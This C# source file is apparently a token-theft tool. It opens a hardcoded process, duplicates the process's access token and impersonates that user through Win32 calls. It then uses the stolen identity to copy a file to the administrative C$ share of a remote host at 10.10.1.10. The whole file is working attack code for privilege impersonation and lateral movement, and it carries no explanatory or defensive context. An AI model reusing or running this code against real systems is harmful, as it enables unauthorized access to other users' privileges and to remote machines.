using System.IO;
using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using MW32 = Microsoft.Win32;

namespace Copy
{
	public static class Tokens
	{
		private static List<IntPtr> OpenHandles = new List<IntPtr>();
		
        private static IntPtr GetTokenForProcess(UInt32 ProcessID)
        {
            IntPtr hProcess = Win32.Kernel32.OpenProcess(0x0400, true, ProcessID);
            if (hProcess == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }
            OpenHandles.Add(hProcess);

            IntPtr hProcessToken = IntPtr.Zero;
            if (!Win32.Kernel32.OpenProcessToken(hProcess, Win32.Advapi32.TOKEN_ALT, out hProcessToken))
            {
                return IntPtr.Zero;
            }
            OpenHandles.Add(hProcessToken);
            Win32.Kernel32.CloseHandle(hProcess);

            return hProcessToken;
        }
		public static bool ImpersonateProcess(UInt32 ProcessID)
        {
            IntPtr hProcessToken = GetTokenForProcess(ProcessID);
            if (hProcessToken == IntPtr.Zero)
            {
                return false;
            }

            Win32.WinBase._SECURITY_ATTRIBUTES securityAttributes = new Win32.WinBase._SECURITY_ATTRIBUTES();
            IntPtr hDuplicateToken = IntPtr.Zero;
            if (!Win32.Advapi32.DuplicateTokenEx(
                    hProcessToken,
                    (UInt32)Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                    ref securityAttributes,
                    Win32.WinNT._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    Win32.WinNT.TOKEN_TYPE.TokenPrimary,
                    out hDuplicateToken
                )
            )
            {
                Win32.Kernel32.CloseHandle(hProcessToken);
                return false;
            }
            OpenHandles.Add(hDuplicateToken);

            if (!Win32.Advapi32.ImpersonateLoggedOnUser(hDuplicateToken))
            {
                Win32.Kernel32.CloseHandle(hProcessToken);
                Win32.Kernel32.CloseHandle(hDuplicateToken);
                return false;
            }
            Win32.Kernel32.CloseHandle(hProcessToken);
            return true;
        }
	}
	public static class Win32
    {
        public static class Kernel32
        {
            [DllImport("kernel32.dll")]
            public static extern IntPtr OpenProcess(
                UInt32 dwDesiredAccess,
                bool bInheritHandle,
                UInt32 dwProcessId
            );

            [DllImport("kernel32.dll")]
            public static extern Boolean OpenProcessToken(
                IntPtr hProcess,
                UInt32 dwDesiredAccess,
                out IntPtr hToken
            );

            [DllImport("kernel32.dll")]
            public static extern Boolean CloseHandle(
                IntPtr hProcess
            );
		}
		
		public static class Advapi32
        {
			public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
			public const UInt32 TOKEN_DUPLICATE = 0x0002;
			public const UInt32 TOKEN_IMPERSONATE = 0x0004;
			public const UInt32 TOKEN_QUERY = 0x0008;
			public const UInt32 TOKEN_ALT = (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY);
			[DllImport("advapi32.dll", SetLastError = true)]
            public static extern Boolean DuplicateTokenEx(
                IntPtr hExistingToken,
                UInt32 dwDesiredAccess,
                ref WinBase._SECURITY_ATTRIBUTES lpTokenAttributes,
                WinNT._SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
                WinNT.TOKEN_TYPE TokenType,
                out IntPtr phNewToken
            );
			
			[DllImport("advapi32.dll", SetLastError = true)]
            public static extern Boolean ImpersonateLoggedOnUser(
                IntPtr hToken
            );
		}
		
	    public class WinBase
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct _SECURITY_ATTRIBUTES
            {
                UInt32 nLength;
                IntPtr lpSecurityDescriptor;
                Boolean bInheritHandle;
            };
        }
		
		public class WinNT
        {
            public enum _SECURITY_IMPERSONATION_LEVEL
            {
                SecurityAnonymous,
                SecurityIdentification,
                SecurityImpersonation,
                SecurityDelegation
            }

            public enum TOKEN_TYPE
            {
                TokenPrimary = 1,
                TokenImpersonation
            }

            [Flags]
            public enum ACCESS_MASK : uint
            {
                MAXIMUM_ALLOWED = 0x02000000,
            };
        }
    }
    class CopyFile
    {
        public static void Main(string[] args)
        {
			UInt32 pid = 2888;
			Tokens.ImpersonateProcess(pid);
			
            System.Console.WriteLine("Trying to copy a file..");
			try
			{
				File.Copy("steal_token.cs", "\\\\10.10.1.10\\c$\\steal_token.txt");
				Console.WriteLine("Copied file.");
			}
			catch (System.UnauthorizedAccessException)
			{
				Console.WriteLine("Access denied.");
			}
			catch (System.IO.IOException)
			{
				Console.WriteLine("File already exists OR Logon failure: unknown user name or bad password.");
			}
			catch (Exception ex)
			{
				Console.WriteLine("Unexpected error.\n" + ex);
			}
        }
    }
}